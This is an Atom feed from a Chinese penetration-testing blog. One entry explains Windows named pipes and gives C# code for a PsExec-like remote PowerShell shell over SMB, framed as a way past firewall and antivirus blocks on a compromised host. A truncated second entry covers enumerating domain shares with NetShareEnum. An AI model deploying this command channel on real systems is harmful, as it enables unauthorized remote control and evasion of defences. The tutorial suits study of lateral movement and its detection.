<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RcoIl的窝</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rcoil.me/"/>
  <updated>2019-11-04T07:17:04.831Z</updated>
  <id>https://rcoil.me/</id>
  
  <author>
    <name>RcoIl</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【知识回顾】命名管道</title>
    <link href="https://rcoil.me/2019/11/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93/"/>
    <id>https://rcoil.me/2019/11/【知识回顾】命名管道/</id>
    <published>2019-11-04T11:52:59.000Z</published>
    <updated>2019-11-04T07:17:04.831Z</updated>
    
    <content type="html"><![CDATA[<p>本文是根据之前文章中涉及到的命名管道的一个理解和延伸进行编写的。</p><p><strong><em>PS</em></strong>：本文开始是投稿于安全客。但由于和别的稿件冲突了，相比下另一篇在原理探究，利用上会稍详尽一些些。只能说两篇文章是从不同角度进行的，建议结合阅读，文章连接：<a href="https://www.anquanke.com/post/id/190207#h2-0" target="_blank" rel="noopener">Windows 命名管道研究初探</a>。</p><a id="more"></a><h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>之前在写 <a href="https://rcoil.me/2019/08/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/">深入了解 PsExec [知识回顾]</a>和了解 <code>SMB Beacon</code> 的时候，知道了它们都是通过【知识回顾】命名管道进行通信，所以本文通过一个常见的场景进行编写并绕过说明。</p><p><strong>场景建立</strong>：在 Windows 环境中，无管理员权限的情况下，对已获取权限的机器上使用 <code>ncat</code> 反弹一个 <code>shell</code>，但是遭到防火墙或反病毒程序的阻拦 。</p><h2 id="0x01-Windows-防火墙行为分析"><a href="#0x01-Windows-防火墙行为分析" class="headerlink" title="0x01 Windows 防火墙行为分析"></a>0x01 Windows 防火墙行为分析</h2><p>在 Windows 中，当尝试使用 <code>Bind()</code> 绑定一个 <code>TCP Socket</code> 时，<strong>Defender</strong> 会弹窗提示是否允许此程序进行网络连接，只有用户点击允许访问才可放行。当然，如果我们拥有管理员权限，可以将此程序添加到白名单中，允许连接。但我们这里使用的普通用户权限，是无法添加修改防火墙规则的。所以当无权限进行修改时，注定会弹窗提示，也意味着我们的此攻击操作注定失败。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加的防火墙规则</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"ncat.exe"</span> dir=<span class="keyword">in</span> program=<span class="string">"E:\Code\Ncat\ncat.exe"</span> action=allow</span><br></pre></td></tr></table></figure><p>如果不添加防火墙规则，则会出现下图情况。</p><p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_12-12-03.png" alt=""></p><p>这种情下，<code>Reverse shell</code> 也是会失败的，那么我们该如何绕过这种限制呢？</p><p><strong>其实，这个很简单：</strong> <em>我们就直接利用防火墙默认允许的规则就行。</em></p><p>在 Windows 中，通常默认允许 <strong>SMB 协议</strong> 出入站，因此，如果有什么功能或机制可以用于与外部机器进行通信的，<strong>SMB 协议</strong> 无疑是一种很好的选择。而 <strong>【知识回顾】命名管道</strong> 就是基于 <em>SMB 协议</em> 进行通信的，所以我们可以基于【知识回顾】命名管道与外部机器进行通信，从而建立控制通道。</p><h2 id="0x02-【知识回顾】命名管道"><a href="#0x02-【知识回顾】命名管道" class="headerlink" title="0x02 【知识回顾】命名管道"></a>0x02 【知识回顾】命名管道</h2><p><a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes" target="_blank" rel="noopener">“【知识回顾】命名管道”</a> 又名 “命名管线”，但是通常都叫命名管道，是一种简单基于 <code>SMB 协议</code>的进程间通信（Internet Process Connection - <em>IPC</em>）机制。 在计算机编程里，命名管道可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持可靠的、单向或双向的数据通信传输。<strong>这完全符合我们的需求</strong>。</p><p>和一般的管道不同，命名管道可以被不同进程以不同的方式方法调用（可以跨语言、跨平台）。只要程序知道命名管道的名字，任何进程都可以通过该名字打开管道的另一端，根据给定的权限和服务器进程通信。  </p><p>默认情况下，我们无法使用命名管道来控制计算机通信，但是微软提供了很多种 Windows API 函数，例如 ：</p><ul><li>用于实例化命名管道的服务器端函数是 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/Winbase/nf-winbase-createnamedpipea" target="_blank" rel="noopener"><strong>CreateNamedPipe</strong></a></li><li>接受连接的服务器端功能是 <a href="https://msdn.microsoft.com/en-us/library/Aa365146(v=VS.85" target="_blank" rel="noopener"><strong>ConnectNamedPipe</strong></a>.aspx)</li><li>客户端进程通过使用 <a href="https://docs.microsoft.com/windows/desktop/api/fileapi/nf-fileapi-createfilea" target="_blank" rel="noopener"><strong>CreateFile</strong></a> 或 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/Winbase/nf-winbase-callnamedpipea" target="_blank" rel="noopener"><strong>CallNamedPipe </strong></a>函数连接到命名管道</li></ul><p><strong>命名规范</strong></p><p>【命名管道的命名是采用的 <strong>UNC 格式</strong>：<code>\\Server\Pipe\[Path]Name</code> 的。 </p><p>第一部分<code>\\Server</code>指定了服务器的名字，命名管道服务即在此服务器创建，其字符串部分可表示为一个小数点(表示本机)、星号(当前网络字段)、域名或是一个真正的服务；第二部分 <code>\Pipe</code> 与邮槽的 <code>\Mailslot</code> 一样是一个不可变化的硬编码字串，以指出该文件是从属于 NTFS；第三部分<code>[Path]Name</code>则使应用程序可以唯一定义及标识一个命名管道的名字，而且可以设置多级目录。 </p><p> 在 <code>C#</code>中，若要实现命名管道，如今只需要使用 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.io.pipes.namedpipeserverstream" target="_blank" rel="noopener">NamedPipeServerStream</a> 和 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.io.pipes.namedpipeclientstream" target="_blank" rel="noopener">NamedPipeClientStream</a> 类，开盒即食。 </p><h2 id="0x03-使用-C-实现"><a href="#0x03-使用-C-实现" class="headerlink" title="0x03 使用 C#实现"></a>0x03 使用 <code>C#</code>实现</h2><p>命名管道既可以支持直接字节传输模式（<code>PipeTransmissionMode.Byte</code>），也可以支持消息传输模式（<code>PipeTransmissionMode.Message</code>） 。</p><ul><li><p>在字节模式中，信息以连续字节流的形式在客户与服务器之间流动。这也就意味着对于客户机应用和服务器应用在任何一个特定的时间段内都无法准确知道有多少字节从管道中读出或写入。在这种通信模式中，一方在向管道写入某个数量的字节后并不能保证管道的另一方能读出等量的字节。</p></li><li><p>对于消息模式，客户机和服务器则是通过一系列不连续的数据包进行数据的收发。从管道发出的每一条消息都必须作为一条完整的消息读入。</p></li></ul><p>在此建议使用消息模式。 下面先看看字节模式。</p><h3 id="3-1、-测试服务端代码"><a href="#3-1、-测试服务端代码" class="headerlink" title="3.1、 测试服务端代码"></a>3.1、 测试服务端代码</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WaitData</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建命名管道</span></span><br><span class="line">    <span class="keyword">using</span> (NamedPipeServerStream pipeServer =</span><br><span class="line">           <span class="keyword">new</span> NamedPipeServerStream(<span class="string">"testpipe"</span>, PipeDirection.InOut, <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Waiting for client connection..."</span>);</span><br><span class="line">            <span class="comment">// 等待连接</span></span><br><span class="line">            pipeServer.WaitForConnection();</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Client connected."</span>);</span><br><span class="line">            <span class="comment">// 指定传输模式</span></span><br><span class="line">            pipeServer.ReadMode = PipeTransmissionMode.Byte;</span><br><span class="line">            <span class="keyword">using</span> (StreamReader sr = <span class="keyword">new</span> StreamReader(pipeServer))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> con = sr.ReadToEnd();</span><br><span class="line">                Console.WriteLine(con);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2、测试客户端代码"><a href="#3-2、测试客户端代码" class="headerlink" title="3.2、测试客户端代码"></a>3.2、测试客户端代码</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SendData</span>(<span class="params"><span class="keyword">string</span> ServerName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 连接服务端命名管道</span></span><br><span class="line">        <span class="keyword">using</span> (NamedPipeClientStream pipeClient =</span><br><span class="line">               <span class="keyword">new</span> NamedPipeClientStream(ServerName, <span class="string">"testpipe"</span>, PipeDirection.InOut, PipeOptions.None, TokenImpersonationLevel.None))</span><br><span class="line">        &#123;</span><br><span class="line">            pipeClient.Connect();</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Connection established succesfully."</span>);</span><br><span class="line">            <span class="keyword">using</span> (StreamWriter sw = <span class="keyword">new</span> StreamWriter(pipeClient))</span><br><span class="line">            &#123;</span><br><span class="line">                sw.WriteLine(<span class="string">"xixixi"</span>);</span><br><span class="line">                sw.Flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3、测试结果"><a href="#3-3、测试结果" class="headerlink" title="3.3、测试结果"></a>3.3、测试结果</h3><p><img src="\image\【知识回顾】命名管道\blog_2019-10-26_21-29-45.png" alt=""></p><p>此项测试使用的是字节传输模式（<code>PipeTransmissionMode.Byte</code>）。但为了执行命令，我们将上面的代码改成了 <code>PipeTransmissionMode.Message</code> 模式，并且需要引入之前在翻译文章 <a href="https://www.anquanke.com/post/id/189152" target="_blank" rel="noopener">丢掉Powershell.exe来渗透测试</a> 中看到的执行命令的一个方法。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">RunScript</span>(<span class="params"><span class="keyword">string</span> script</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    Runspace MyRunspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">    MyRunspace.Open();</span><br><span class="line">    Pipeline MyPipeline = MyRunspace.CreatePipeline(); </span><br><span class="line">    MyPipeline.Commands.AddScript(script);</span><br><span class="line">    MyPipeline.Commands.Add(<span class="string">"Out-String"</span>);</span><br><span class="line">    Collection&lt;PSObject&gt; outputs = MyPipeline.Invoke();</span><br><span class="line">    MyRunspace.Close();</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder(); </span><br><span class="line">    <span class="keyword">foreach</span> (PSObject pobject <span class="keyword">in</span> outputs) </span><br><span class="line">    &#123; </span><br><span class="line">        sb.AppendLine(pobject.ToString()); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.ToString(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-shell-实现"><a href="#0x04-shell-实现" class="headerlink" title="0x04 shell 实现"></a>0x04 shell 实现</h2><p>我们完全可以按照 <code>Psexec</code> 的原理，自己构建一个命令执行的通道。</p><h3 id="4-1、服务端实现"><a href="#4-1、服务端实现" class="headerlink" title="4.1、服务端实现"></a>4.1、服务端实现</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WaitData</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个运行空间</span></span><br><span class="line">    Runspace runspace = <span class="literal">null</span>;</span><br><span class="line">    runspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">    runspace.ApartmentState = System.Threading.ApartmentState.STA; </span><br><span class="line">    runspace.Open();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (<span class="keyword">var</span> pipeServer = <span class="keyword">new</span> NamedPipeServerStream(</span><br><span class="line">            <span class="string">"testpipe"</span>,</span><br><span class="line">            PipeDirection.InOut,</span><br><span class="line">            NamedPipeServerStream.MaxAllowedServerInstances,</span><br><span class="line">            PipeTransmissionMode.Message))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Waiting for client connection..."</span>);</span><br><span class="line">            pipeServer.WaitForConnection();</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Client connected."</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> messageBytes = ReadMessage(pipeServer);</span><br><span class="line">                <span class="keyword">var</span> line = Encoding.Default.GetString(messageBytes);</span><br><span class="line">                Console.WriteLine(<span class="string">"[*] Received: &#123;0&#125;"</span>, line);</span><br><span class="line">                <span class="keyword">if</span> (line.ToLower() == <span class="string">"exit"</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 参考：https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/</span></span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Pipeline PsPipe = runspace.CreatePipeline();</span><br><span class="line">                    PsPipe.Commands.AddScript(line);</span><br><span class="line">                    PsPipe.Commands.Add(<span class="string">"Out-String"</span>);</span><br><span class="line">                    Collection&lt;PSObject&gt; results = PsPipe.Invoke();</span><br><span class="line">                    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    <span class="keyword">foreach</span> (PSObject obj <span class="keyword">in</span> results)</span><br><span class="line">                    &#123;</span><br><span class="line">                        stringBuilder.AppendLine(obj.ToString());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> response = Encoding.Default.GetBytes(stringBuilder.ToString());</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        pipeServer.Write(response, <span class="number">0</span>, response.Length);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(<span class="string">"[!] Pipe is broken!"</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2、客户端实现"><a href="#4-2、客户端实现" class="headerlink" title="4.2、客户端实现"></a>4.2、客户端实现</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SendData</span>(<span class="params"><span class="keyword">string</span> ServerName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Console.WriteLine(<span class="string">"[+] Connecting to "</span> + ServerName);</span><br><span class="line">    <span class="keyword">using</span> (<span class="keyword">var</span> pipeClient = <span class="keyword">new</span> NamedPipeClientStream(ServerName, <span class="string">"testpipe"</span>, PipeDirection.InOut))</span><br><span class="line">    &#123;</span><br><span class="line">        pipeClient.Connect(<span class="number">5000</span>);</span><br><span class="line">        pipeClient.ReadMode = PipeTransmissionMode.Message;</span><br><span class="line">        Console.WriteLine(<span class="string">"[+] Connection established succesfully."</span>);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;   </span><br><span class="line">            Console.Write(<span class="string">"csexec&gt; "</span>);</span><br><span class="line">            <span class="keyword">var</span> input = Console.ReadLine();</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(input)) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Encoding.Default.GetBytes(input);</span><br><span class="line">            pipeClient.Write(bytes, <span class="number">0</span>, bytes.Length);</span><br><span class="line">            <span class="keyword">if</span> (input.ToLower() == <span class="string">"exit"</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">var</span> result = ReadMessage(pipeClient);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            Console.WriteLine(Encoding.Default.GetString(result));</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3、测试结果"><a href="#4-3、测试结果" class="headerlink" title="4.3、测试结果"></a>4.3、测试结果</h3><p><img src="\image\【知识回顾】命名管道\blog_2019-10-26_21-41-09.png" alt=""></p><p>注意：此时的操作，是根据当前 <code>Client</code> 的权限进行的。</p><p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_11-47-54.png" alt=""></p><p>抓包看看此时的网络情况。</p><p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_12-36-47.png" alt=""></p><p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_12-37-26.png" alt=""></p><p>这整个过程与 <code>Psexec</code> 差不多一致，只是缺少了与  服务控制管理器（SCM） 进行通信的过程。整个过程中防火墙和反病毒程序无任何阻拦。如果要应用于实战中，可以将内容先进行加密在进行传输。</p><p>这里再说一个关于平时常用的 <code>IPC$</code>。</p><p><code>IPC</code> 中文翻译网络进程连接服务，也就是说这个是为 <strong>“进程”</strong> 间建立网络连接而存在的服务，说的再明确点就是：<code>IPC$</code> 是一个为 “各类进程” 建立网络通信连接而存在的服务。 </p><p>那么，为什么 <code>SMB Beacon</code> 中，为什么不需要账号密码呢？这个问题留给你们探索！！！</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/how-to-use-named-pipes-for-network-interprocess-communication" target="_blank" rel="noopener">如何：使用命名管道进行网络进程间通信</a></p><p><a href="https://www.cnblogs.com/HDK2016/p/9840989.html" target="_blank" rel="noopener">【C#】解析C#中管道流的使用</a></p><p><a href="https://segmentfault.com/a/1190000003116875" target="_blank" rel="noopener">命名管道实践</a></p><p><a href="https://github.com/malcomvetter/NamedPipes" target="_blank" rel="noopener">NamedPipes</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/ipc/named-pipes" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/ipc/named-pipes</a> </p><p><a href="https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/" target="_blank" rel="noopener">We don’t need powershell.exe</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是根据之前文章中涉及到的命名管道的一个理解和延伸进行编写的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;PS&lt;/em&gt;&lt;/strong&gt;：本文开始是投稿于安全客。但由于和别的稿件冲突了，相比下另一篇在原理探究，利用上会稍详尽一些些。只能说两篇文章是从不同角度进行的，建议结合阅读，文章连接：&lt;a href=&quot;https://www.anquanke.com/post/id/190207#h2-0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Windows 命名管道研究初探&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】获取域内机器共享</title>
    <link href="https://rcoil.me/2019/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%9C%BA%E5%99%A8%E5%85%B1%E4%BA%AB/"/>
    <id>https://rcoil.me/2019/11/【域渗透】获取域内机器共享/</id>
    <published>2019-11-01T11:06:48.000Z</published>
    <updated>2019-11-01T02:28:51.843Z</updated>
    
    <content type="html"><![CDATA[<p>在域内遇到瓶颈时，不妨看看域内机器开放的共享，获取有些收获。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>大多数内网渗透总结在提到使用 <code>WinAPI枚举系统</code> 只是讲述了利用 <code>NetSessionEnum</code> 来找寻<code>登陆 sessions</code>， 利用 <code>NetWkstaUserEnum</code> 来枚举登陆的用户，利用 <code>NetShareEnum</code> 来找寻共享，但却未说明其原型理论。由于前篇文章 <a href="[https://rcoil.me/2019/10/【域渗透】域内会话收集/](https://rcoil.me/2019/10/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9F%9F%E5%86%85%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86/">【域渗透】域内会话收集</a>) 已经针对 <code>NetSessionEnum</code> 和 <code>NetWkstaUserEnum</code>  进行说明，所以本文是对 <code>NetShareEnum</code> 做一个概述及应用的补充。</p><h2 id="0x01-NetShareEnum-函数"><a href="#0x01-NetShareEnum-函数" class="headerlink" title="0x01 NetShareEnum 函数"></a>0x01 NetShareEnum 函数</h2><p>以当前权限检索有关服务器上每个共享资源的信息。还可以使用 <a href="https://docs.microsoft.com/windows/desktop/api/winnetwk/nf-winnetwk-wnetenumresourcea" target="_blank" rel="noopener">WNetEnumResource</a> 函数来检索资源信息。但是，<strong>WNetEnumResource</strong>不会枚举隐藏的共享或连接到共享的用户。</p><p>该函数原型为：</p><p><img src="/image/【域渗透】获取域内机器共享/blog_2019-10-16_17-15-43.png" alt=""></p><p>它需要 7 个参数。</p><ul><li><p><strong>servername：</strong>指向一个字符串的指针，该字符串指定要在其上执行该功能的远程服务器的DNS或NetBIOS名称。如果此参数为<strong>NULL</strong>，则使用本地计算机</p></li><li><p><strong>level：</strong>指定数据的信息级别。</p><p>  | 值    | <strong>含义</strong>                                   |<br>  | —- | —————————————- |<br>  | 0    | 返回共享名称。所述<em>bufptr</em>参数指向的数组 <a href="https://docs.microsoft.com/windows/desktop/api/lmshare/ns-lmshare-share_info_0" target="_blank" rel="noopener">SHARE_INFO_0</a>结构。 |<br>  | 1    | 返回有关共享资源的信息，包括资源的名称和类型以及与资源关联的注释。所述<em>bufptr</em>参数指向的数组 <a href="https://docs.microsoft.com/windows/desktop/api/lmshare/ns-lmshare-share_info_1" target="_blank" rel="noopener">SHARE_INFO_1</a>结构。 |<br>  | 2    | 返回有关共享资源的信息，包括资源名称，类型和权限，密码以及连接数。所述<em>bufptr</em>参数指向的数组 <a href="https://docs.microsoft.com/windows/desktop/api/lmshare/ns-lmshare-share_info_2" target="_blank" rel="noopener">SHARE_INFO_2</a>结构。 |<br>  | 502  | 返回有关共享资源的信息，包括资源名称，类型和权限，连接数以及其他相关信息。所述<em>bufptr</em>参数指向的数组 <a href="https://docs.microsoft.com/windows/desktop/api/lmshare/ns-lmshare-share_info_502" target="_blank" rel="noopener">SHARE_INFO_502</a>结构。不返回来自不同范围的共享。有关范围界定的更多信息，请参见<a href="https://docs.microsoft.com/windows/desktop/api/lmserver/nf-lmserver-netservertransportaddex" target="_blank" rel="noopener">NetServerTransportAddEx</a>函数的文档的“备注”部分。 |<br>  | 503  | 返回有关共享资源的信息，包括资源名称，类型和权限，连接数以及其他相关信息。所述<em>bufptr</em>参数指向的数组<a href="https://docs.microsoft.com/windows/desktop/api/lmshare/ns-lmshare-share_info_503" target="_blank" rel="noopener">SHARE_INFO_503</a>结构。返回所有范围的共享。如果此结构的<strong>shi503_servername</strong>成员为“ *”，则没有配置的服务器名称，并且<strong>NetShareEnum</strong>函数枚举所有未作用域名称的共享。<strong>Windows Server 2003和Windows XP：</strong>  不支持此信息级别。 |</p></li><li><p><strong>bufptr：</strong>向接收数据的缓冲区的指针。该数据的格式取决于 <em>level</em> 参数的值。</p></li><li><p><strong>prefmaxlen：</strong>指定返回数据的首选最大长度，以字节为单位。如果指定<strong>MAX_PREFERRED_LENGTH</strong>，则该函数分配数据所需的内存量。如果在此参数中指定另一个值，则它可以限制函数返回的字节数。如果缓冲区大小不足以容纳所有条目，则该函数返回<strong>ERROR_MORE_DATA</strong>。</p></li><li><strong>entriesread：</strong>指向一个值的指针，该值接收实际枚举的元素数。</li><li><p><strong>totalentries：</strong>指向一个值的值，该值接收可能已经枚举的条目总数。</p></li><li><p><strong>resume_handle：</strong>指向包含恢复句柄的值的指针，该恢复句柄用于继续现有的共享搜索。</p></li></ul><p>而此 API 的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> server = <span class="string">"rcoil.me"</span>;</span><br><span class="line"><span class="keyword">int</span> ret = NetShareEnum(server, <span class="number">1</span>, <span class="keyword">ref</span> bufPtr, MAX_PREFERRED_LENGTH, <span class="keyword">ref</span> entriesread, <span class="keyword">ref</span> totalentries, <span class="keyword">ref</span> resume_handle);</span><br></pre></td></tr></table></figure><p>它会返回如下内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span 